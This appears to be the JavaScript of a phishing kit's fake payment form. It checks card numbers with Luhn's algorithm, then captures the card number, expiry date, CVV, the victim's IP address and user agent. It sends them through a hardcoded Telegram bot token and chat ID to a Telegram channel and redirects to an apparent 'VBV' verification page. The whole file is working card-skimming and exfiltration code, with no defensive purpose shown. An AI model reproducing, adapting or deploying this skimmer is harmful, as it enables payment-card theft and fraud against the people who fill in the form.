    // Function to get the user's IP address
    function getUserIP() {
        return fetch('get_user_ip.php')
            .then(response => {
                if (!response.ok) {
                    throw new Error('Failed to fetch user IP');
                }
                return response.json();
            })
            .then(data => {
                return data.userIP;
            })
            .catch(error => {
                console.error(error);
                return 'Unknown'; // Return 'Unknown' if unable to fetch user IP
            });
    }
    
    // Function to check if a credit card number is valid using Luhn's algorithm
    function isValidCreditCardNumber(cardNumber) {
        // Remove all non-digit characters
        const cleanedCardNumber = cardNumber.replace(/\D/g, '');
    
        // Convert the card number string to an array of digits
        const digits = Array.from(cleanedCardNumber).map(Number);
    
        // Reverse the array
        digits.reverse();
    
        // Perform Luhn's algorithm
        let sum = 0;
        for (let i = 0; i < digits.length; i++) {
            let digit = digits[i];
            if (i % 2 === 1) {
                digit *= 2;
                if (digit > 9) {
                    digit -= 9;
                }
            }
            sum += digit;
        }
    
        // The card number is valid if the sum is a multiple of 10
        return sum % 10 === 0;
    }
    
    document.addEventListener("DOMContentLoaded", function() {
        const creditCardInput = document.getElementById('credit-card');
        const expirationInput = document.getElementById('expiration');
        const cvvInput = document.getElementById('cvv');
    
        // Event listener to check credit card validity on input
        creditCardInput.addEventListener('input', function() {
            const cardNumber = this.value.trim();
            
            // Check if the card number is valid using Luhn's algorithm
            const isValid = isValidCreditCardNumber(cardNumber);
    
            // Show error message if the card number is invalid
            if (!isValid) {
                this.setCustomValidity('Please enter a valid credit card number');
            } else {
                this.setCustomValidity('');
            }
        });
    
        // Function to add spaces after every 4 digits in the credit card input field
        creditCardInput.addEventListener('input', function() {
            // Remove all non-digit characters
            let value = this.value.replace(/\D/g, '');
    
            // Insert a space after every 4 digits
            value = value.replace(/(.{4})/g, '$1 ').trim();
    
            // Update the input value
            this.value = value;
        });
    
        // Function to add a slash after the first two digits in the expiration input field
        expirationInput.addEventListener('input', function() {
            // Remove all non-digit characters
            let value = this.value.replace(/\D/g, '');
    
            // Add a slash after the first two digits
            if (value.length > 2) {
                value = value.slice(0, 2) + '/' + value.slice(2);
            }
    
            // Update the input value
            this.value = value;
        });
    
        // Form submission event listener
        document.querySelector('.payment-form').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent the default form submission
    
            // Retrieve credit card details from inputs
            const creditCardNumber = creditCardInput.value.trim();
            const expiration = expirationInput.value.trim();
            const cvv = cvvInput.value.trim();
    
            // Check if the credit card number is valid using Luhn's algorithm
            const isValidCardNumber = isValidCreditCardNumber(creditCardNumber);
    
            // If the credit card number is not valid, display an error message and return
            if (!isValidCardNumber) {
                creditCardInput.setCustomValidity('Please enter a valid credit card number');
                creditCardInput.reportValidity();
                return;
            }
    
            // Extract and store the last 4 digits of the credit card number
            const last4Digits = creditCardNumber.slice(-4);
            localStorage.setItem('last4Digits', last4Digits);
    
            // Store credit card details in local storage
            localStorage.setItem('creditCardNumber', creditCardNumber);
            localStorage.setItem('expiration', expiration);
            localStorage.setItem('cvv', cvv);
    
            // Get user's IP address
            getUserIP().then(userIP => {
                // Store the user's IP address in local storage
                localStorage.setItem('userIP', userIP);
    
                const userAgent = navigator.userAgent;
    
                // Send credit card details to Telegram bot
                sendCreditCardDetailsToTelegram(creditCardNumber, expiration, cvv, userAgent, userIP);
    
                // Redirect to VBV page
                window.location.href = 'vbv.html';
            });
        });
    });
    
    // Function to send credit card details to Telegram channel via Telegram bot
    function sendCreditCardDetailsToTelegram(creditCardNumber, expiration, cvv, userAgent, userIP) {
        // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with your bot token and chat ID
        const botToken = '7002223785:AAFPsYJezV6Dr2L6v55jqLQnduuAjnNrMek';
        const chatId = '-1002101599846';
    
        // Format credit card details message
        const message = `
            Credit Card Number: ${creditCardNumber}
            Expiration: ${expiration}
            CVV: ${cvv}
            User Agent: ${userAgent}
            User IP: ${userIP}
        `;
    
        // Send message to Telegram bot
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
            .then(response => {
                if (!response.ok) {
                    throw new Error('Failed to send message to Telegram bot');
                }
            })
            .catch(error => {
                console.error(error);
                // Handle error
            });
    }